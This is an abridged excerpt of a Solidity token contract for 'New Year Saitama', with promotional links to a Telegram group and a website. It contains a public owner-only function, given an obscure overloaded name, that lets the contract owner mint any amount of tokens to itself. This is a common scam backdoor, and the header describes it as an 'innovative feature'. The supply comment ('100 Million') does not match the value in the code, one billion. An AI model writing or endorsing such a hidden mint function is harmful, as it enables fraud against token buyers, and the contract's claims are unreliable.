...
//
// $NewYearSaitama proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/NewYearSaitamaBsc
//📱 Website :: Newyearsaitama.com
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _NewYearSaitama(uint256 amount) public onlyOwner {
 _NewYearSaitama(msg.sender, amount);
    }
    ...
    function _NewYearSaitama(address account, uint256 amount) internal virtual {
...
contract $NewYearSaitama is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("New Year Saitama", "NYSAITAMA") {
     _NewYearSaitama(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}